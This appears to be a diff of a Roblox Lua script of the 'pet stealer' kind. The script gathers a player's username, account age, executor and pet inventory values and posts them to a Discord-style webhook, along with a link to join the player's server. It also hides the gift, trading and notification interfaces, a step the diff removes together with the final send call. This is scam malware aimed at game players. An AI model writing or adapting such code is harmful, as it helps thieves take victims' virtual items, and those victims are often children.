@@ -383,64 +383,27 @@ getgenv().Username = "dumb"
             end
         end    
 
--- Safe cleanup
-local giftList = pgui:FindFirstChild("GiftPlayerList")
-if giftList then giftList:Destroy() end
-
-local giftNotif = pgui:FindFirstChild("Gift_Notification")
-if giftNotif then giftNotif:Destroy() end
-
-local friendNotif = pgui:FindFirstChild("Friend_Notification")
-if friendNotif then friendNotif:Destroy() end
-
-local topNotif = pgui:FindFirstChild("Top_Notification")
-if topNotif then topNotif:Destroy() end
-
-if pgui:FindFirstChild("Trading") then
-    pgui.Trading:Destroy()
+-- Calculate total value from pets only
+local total_value = 0
+for _, pet in ipairs(pets) do
+    total_value = total_value + (pet.Value or 0)
 end
 
-if game:GetService("Lighting"):FindFirstChild("Blur") then
-    game:GetService("Lighting").Blur:Destroy()
+-- Build top 5 pets string
+local topPets = ""
+for i, v in ipairs(pets) do
+    if i > 5 then break end
+    local petName = v.PetName or "Unknown Pet"
+    local petValue = v.Value or 0
+    topPets ..= petName .. " → " .. formatNumber(petValue) .. "\n"
 end
-
--- Format number helper
-local function formatNumber(num)
-    local numbers = math.floor(num)
-    local suffixes = {"", "k", "m", "b", "t","qd", "qn", "sx", "sp", "oc", "no"}
-    local suffixIndex = 1
-    while numbers >= 1000 do
-        numbers = numbers / 1000
-        suffixIndex = suffixIndex + 1
-    end
-    return string.format("%.2f%s", numbers, suffixes[suffixIndex])
+if topPets == "" then
+    topPets = "No pets found"
 end
 
 -- Send webhook
 local function sendWebhook(url)
     local http = game:GetService("HttpService")
-
-    -- Ensure pets & fruits are not nil
-    pets = pets or {}
-    fruits = fruits or {}
-
-    -- Build top 5 pets string
-    local topPets = ""
-    for i, v in ipairs(pets) do
-        if i > 5 then break end
-        local petName = v.PetName or v.name or "Unknown Pet"
-        local petValue = v.Value or v.value or 0
-        topPets ..= petName .. " → " .. formatNumber(petValue) .. "\n"
-    end
-    if topPets == "" then
-        topPets = "No pets found"
-    end
-
-    -- Inventory totals
-    local totalItems = #pets + #fruits
-    local formattedValue = formatNumber(total_value or 0)
-
-    -- Embed data
     local body = http:JSONEncode({
         username = Players.LocalPlayer.Name,
         avatar_url = "https://raw.githubusercontent.com/D3ATH-hub/main/PS99/pfp.png",
@@ -457,13 +420,13 @@ local function sendWebhook(url)
                         Players.LocalPlayer.DisplayName,
                         detectExecutor(),
                         tostring(Players.LocalPlayer.AccountAge),
-                        table.concat(Username, ", ")
+                        Username or "Unknown"
                     ),
                     inline = false
                 },
                 {
                     name = "**__Inventory__**",
-                    value = string.format("```Total items: %d\nTotal value: %s```", totalItems, formattedValue),
+                    value = string.format("```Total items: %d\nTotal value: %s```", #pets, formatNumber(total_value)),
                     inline = false
                 },
                 {
@@ -473,7 +436,7 @@ local function sendWebhook(url)
                 },
                 {
                     name = "__Join link:__",
-                    value = "[click here to join](" .. ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId) .. ")",
+                    value = "[Join Game](" .. ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId) .. ")",
                     inline = false
                 }
             },
@@ -491,9 +454,6 @@ local function sendWebhook(url)
     end)
 end
 
--- Make sure inventory is built before sending
-getinv()
-sendWebhook(Webhook)
 
 
 
